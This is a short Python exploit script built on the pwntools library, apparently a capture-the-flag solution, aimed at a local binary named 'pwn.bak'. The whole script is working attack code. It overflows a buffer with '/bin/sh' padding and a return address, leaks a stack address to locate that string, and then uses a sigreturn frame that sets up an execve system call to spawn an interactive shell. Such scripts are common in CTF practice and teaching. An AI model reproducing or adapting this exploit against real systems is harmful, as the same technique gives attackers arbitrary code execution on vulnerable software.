from pwn import *


#p=gdb.debug('./pwn.bak','break vuln')
p=process('./pwn.bak')
pause()
context.arch='amd64'
#context.terminal = ['gnome-terminal','-x','sh','-c']
vuln_addr=0x00000000004004ED
mov_rax_15=0x00000000004004da
sys_add=0x0000000000400501
#gdb.attach(p.pid)
payload1=b'/bin/sh\x00'*2+p64(vuln_addr)
p.send(payload1)

binsh_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))-0x118


frame=SigreturnFrame()
frame.rax=constants.SYS_execve
frame.rdi=binsh_addr
frame.rsi=0
frame.rdx=0
frame.rip=sys_add

payload2=b'/bin/sh\x00'*2+p64(mov_rax_15)+p64(sys_add)+bytes(frame)

p.send(payload2)

p.interactive()
